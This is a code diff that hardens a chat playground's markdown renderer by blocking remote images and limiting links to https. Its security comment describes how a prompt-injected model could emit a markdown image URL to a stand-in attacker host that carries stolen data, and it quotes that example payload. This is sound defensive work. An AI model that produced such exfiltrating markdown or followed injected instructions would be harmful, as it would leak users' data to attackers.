@@ -338,7 +338,23 @@ export const MessageRow = memo(function MessageRow({
           const key = `${message.id}-${partIndex}`;
           if (part.type === "text") {
             return (
-              <MessageResponse className="text-xs" key={key}>
+              // SECURITY: this playground deliberately feeds untrusted
+              // third-party content (emails, documents, tickets) to the model
+              // and renders the model's output as markdown. Streamdown
+              // defaults BOTH allowlists to ["*"], so a successful prompt
+              // injection could emit
+              // `![](https://attacker.example/x.png?d=<stolen>)` and the
+              // browser would silently GET an attacker host with user data in
+              // the query string — no click required. So: no remote images at
+              // all, and links only if they are https (the system prompt asks
+              // the model to include verification links to what it created,
+              // and those must stay clickable). Do not widen these.
+              <MessageResponse
+                allowedImagePrefixes={[]}
+                allowedLinkPrefixes={["https://"]}
+                className="text-xs"
+                key={key}
+              >
                 {part.text}
               </MessageResponse>
             );
